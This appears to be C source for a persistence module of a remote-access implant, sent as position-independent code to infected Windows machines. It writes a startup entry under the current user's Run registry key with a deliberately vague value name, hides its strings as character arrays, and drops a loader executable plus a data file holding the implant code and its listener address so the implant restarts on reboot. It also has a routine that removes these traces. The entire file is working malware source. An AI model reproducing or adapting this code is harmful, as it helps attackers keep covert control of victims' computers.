/*
PIC module to be sent as stripped binary code to the implant, then added to its modules struct.
Used to create a registry key value and necessary files on disk to restart implant on system reboot
*/

#define WIN32_LEAN_AND_MEAN

#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'

#include "../shared/64BitHelper.h"
#include "../shared/Config.h"


// Registry info struct
typedef struct _REGINFO
{
    HKEY hKeyRoot;
    uint16_t* KEY_ROOT;
    uint16_t* KEY_PATH;
    uint16_t* KEY_VALUE;
    uint16_t* EXE_PATH;
    uint16_t* DATA_PATH;
} REGINFO, * PREGINFO;


/*
* @brief Creates the specified file in the necessary persistence path and writes in the supplied data
* @param [in] Config network context, dynamic imports, and runtime data
* @param [in] FilePath, pointer to wide string of the file path to write the file to
* @param [in] FileData, pointer to file data buffer to write into the file
* @param [in] DataLength, size of the data to write into the file
* @return true on success
*/
static bool CreatePersistenceFile(PCONFIG Config, uint16_t * FilePath, uint8_t * FileData, size_t DataLength)
{
    uint16_t fullFilePath[MAX_PATH];
    if (!Config->Imports->ExpandEnvironmentStringsW(FilePath, fullFilePath, MAX_PATH))
    {
        DBGPRINT(Config->Imports->DbgPrint, "(Persist) Failed to get expansion of desired file path. Error: %lu\n", GetLastError());
        return false;
    }
    HANDLE hFile = Config->Imports->CreateFileW(fullFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DBGPRINT(Config->Imports->DbgPrint, "(Persist) Failed to create persistence file. Error: %lu\n", GetLastError());
        return false;
    }
    uint32_t bytesWritten;
    if (!Config->Imports->WriteFile(hFile, FileData, (uint32_t) DataLength, &bytesWritten, NULL))
    {
        DBGPRINT(Config->Imports->DbgPrint, "(Persist) Failed to write data to persistence file. Error: %lu\n", GetLastError());
        Config->Imports->CloseHandle(hFile);
        return false;
    }
    Config->Imports->CloseHandle(hFile);

    return true;
}


/*
* @brief Creates a registry key value targetting an executable to run at system startup
* @param [in] Config network context, dynamic imports, and runtime data
* @param [in] Reg registry path strings (PIC) and handle to the registry key
* @return true on success
*/
static bool CreatePersistRegValue(PCONFIG Config, PREGINFO Reg)
{
    //  Check if value exists, signifying persistence already enabled
    unsigned code = Config->Imports->RegGetValueW(Reg->hKeyRoot, Reg->KEY_PATH, Reg->KEY_VALUE, RRF_RT_REG_SZ | RRF_RT_REG_EXPAND_SZ | RRF_NOEXPAND, NULL, NULL, NULL);
    if (!code)
    {
        DBGPRINT(Config->Imports->DbgPrint, "Executable is already persisted. Registry key value already exists.\n");
        return true;
    }
    else if (code != ERROR_FILE_NOT_FOUND)
    {
        DBGPRINT(Config->Imports->DbgPrint, "Error reading registry key value. Error: %lu.\n", code);
        return false;
    }

    // set persistence key value to desired executable path
    if (Config->Imports->RegSetKeyValueW(Reg->hKeyRoot, Reg->KEY_PATH, Reg->KEY_VALUE, REG_EXPAND_SZ, (const BYTE*) Reg->EXE_PATH, (DWORD) (Config->Imports->wcslen(Reg->EXE_PATH) * sizeof(Reg->EXE_PATH[0]))))
    {
        DBGPRINT(Config->Imports->DbgPrint, "Failed to create/set persistence registry key value. Error: %lu\n", GetLastError());
        return false;
    }
    return true;
}


/*
* @brief Removes persisted registry key and files on disk
* @param [in] Config network context, dynamic imports, and runtime data
* @param [in] Reg registry path strings (PIC) and handle to the registry key
* @return true on success
*/
bool Depersist(PCONFIG Config, PREGINFO Reg)
{
    bool failure = false;
    // ### Remove implant data file
    uint16_t fullDataPath[MAX_PATH];
    // expand path string
    if (!Config->Imports->ExpandEnvironmentStringsW(Reg->DATA_PATH, fullDataPath, MAX_PATH))
    {
        DBGPRINT(Config->Imports->DbgPrint, "(Depersist) Failed to get expansion of persistence data path. Error: %lu\n", Config->Imports->GetLastError());
        failure = true;
    }
    // if expansion didn't fail, attempt to delete the file
    else if (!(Config->Imports->DeleteFileW(fullDataPath)) && Config->Imports->GetLastError() != ERROR_FILE_NOT_FOUND)
    {
        failure = true;
    }
    // ### Remove implant startup exe
    uint16_t fullExePath[MAX_PATH];
    if (!Config->Imports->ExpandEnvironmentStringsW(Reg->EXE_PATH, fullExePath, MAX_PATH))
    {
        DBGPRINT(Config->Imports->DbgPrint, "(Depersist) Failed to get expansion of persistence exe path. Error: %lu\n", Config->Imports->GetLastError());
        failure = true;
    }
    else if (!(Config->Imports->DeleteFileW(fullExePath)) && Config->Imports->GetLastError() != ERROR_FILE_NOT_FOUND)
    {
        failure = true;
    }
    // ### Delete Registry key if it exists
    unsigned code = Config->Imports->RegGetValueW(Reg->hKeyRoot, Reg->KEY_PATH, Reg->KEY_VALUE, RRF_RT_REG_SZ | RRF_RT_REG_EXPAND_SZ | RRF_NOEXPAND, NULL, NULL, NULL);
    if (code == ERROR_FILE_NOT_FOUND)
    {
        // no persistence key value was found
    }
    else if (Config->Imports->RegDeleteKeyValueW(Reg->hKeyRoot, Reg->KEY_PATH, Reg->KEY_VALUE) != ERROR_SUCCESS)
    {
        failure = true;
    }

    return !failure;
}


// Given generic name "ModuleEntry" for reuse of Post-Build CLI command which extract the PIC binary
/*
* @brief Writes a value to the preset registry key to run at system startup, then writes
* two files to disk for implant startup: 1) a data file with the implant code and a config struct,
* * 2) an exe file (target of the registry key) which injects the data file into itself. Alternatively, deletes the registry key and created files based on supplied message.
* @param [in] Config network context, dynamic imports, and runtime data
* @param [in] Message Pointer to message containing Persist command data
* @return true on success / false on failure
*/
bool ModuleEntry(PCONFIG Config, PMESSAGE Message)
{
    /*  Persist Message.Value substructure:
    *   |- bool                 persist / depersist
    *   |- uint32_t             exeLength (Persist only)
    *   |- uint8_t[FileLength]  exeData (Persist only)
    */
    REGINFO Reg;
    Reg.hKeyRoot = HKEY_CURRENT_USER;
    // PIC names to be passed around for key and file creation. The names are intentionally nebulous
    uint16_t KEY_ROOT[] = {'H', 'K', 'E', 'Y', '_', 'C', 'U', 'R', 'R', 'E', 'N', 'T', '_', 'U', 'S', 'E', 'R', '\0'};
    Reg.KEY_ROOT = KEY_ROOT;
    uint16_t KEY_PATH[] = { 'S', 'O', 'F', 'T', 'W', 'A', 'R', 'E', '\\', 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n', '\\', 'R', 'u', 'n', '\0' };
    Reg.KEY_PATH = KEY_PATH;
    uint16_t KEY_VALUE_NAME[] = { 'E', 'I', 'F', 'S', '_', 'S', 't', 'a', 'r', 't', 'U', 'p', '\0' };
    Reg.KEY_VALUE = KEY_VALUE_NAME;
    uint16_t EXE_PATH[] = PERSIST_EXE_PATH;
    Reg.EXE_PATH = EXE_PATH;
    uint16_t DATA_PATH[] = PERSIST_DATA_PATH;
    Reg.DATA_PATH = DATA_PATH;

    // get (de)persistence mode and run corresponding action
    bool persist = (bool) *(uint8_t *)(Message->Value);
    if (persist)
    {
        // ensure message is large enough to read the exeLength
        if (Message->Length < sizeof(bool) + sizeof(uint32_t))
        {
            return false;
        }
        unsigned exeLength = *(uint32_t *)(Message->Value + sizeof(bool));
        // ensure message is large enough to read the full exeData
        if (Message->Length < exeLength - (sizeof(bool) + sizeof(uint32_t)))
        {
            return false;
        }

        // retrieve executable from message
        uint8_t * exeData = (uint8_t *)(Message->Value + sizeof(bool) + sizeof(uint32_t));
        // write registry key for persistence
        if (!CreatePersistRegValue(Config, &Reg))
        {
            Depersist(Config, &Reg);
            return false;
        }
        // write received bootup exe (eifsboot.exe)
        if (!CreatePersistenceFile(Config, Reg.EXE_PATH, exeData, exeLength))
        {
            Depersist(Config, &Reg);
            return false;
        }
        // copy relevant config data into a new config structure, move new config data and implant code to a contiguous buffer
        // Data File:
        // |- Implant code
        // |- Config structure
        size_t dataSize = Config->ImplantSize + sizeof(CONFIG);
        uint8_t * tmpDataBuf = Config->Imports->HeapAlloc(Config->Imports->GetProcessHeap(), 0, dataSize);
        if (!tmpDataBuf)
        {
            Depersist(Config, &Reg);
            return false;
        }
        CONFIG newConfig;
        SecureZeroMemory(&newConfig, sizeof(CONFIG));
        newConfig.ListenerIpAddress = Config->ListenerIpAddress;
        newConfig.ListenerPort = Config->ListenerPort;
        newConfig.ImplantSize = Config->ImplantSize;
        Config->Imports->memcpy_s(tmpDataBuf, dataSize, Config->ImplantEntry, Config->ImplantSize);
        Config->Imports->memcpy_s(tmpDataBuf + Config->ImplantSize, dataSize, &newConfig, sizeof(CONFIG));
        // write config and implant buffer to data file (coredata.tmp)
        if (!CreatePersistenceFile(Config, Reg.DATA_PATH, tmpDataBuf, dataSize))
        {
            Config->Imports->HeapFree(Config->Imports->GetProcessHeap(), 0, tmpDataBuf);
            Depersist(Config, &Reg);
            return false;
        }
        Config->Imports->HeapFree(Config->Imports->GetProcessHeap(), 0, tmpDataBuf);
        // depersist if any step fails
    }
    else
    {
        if (!Depersist(Config, &Reg))
        {
            return false;
        }
    }

    return true;
}
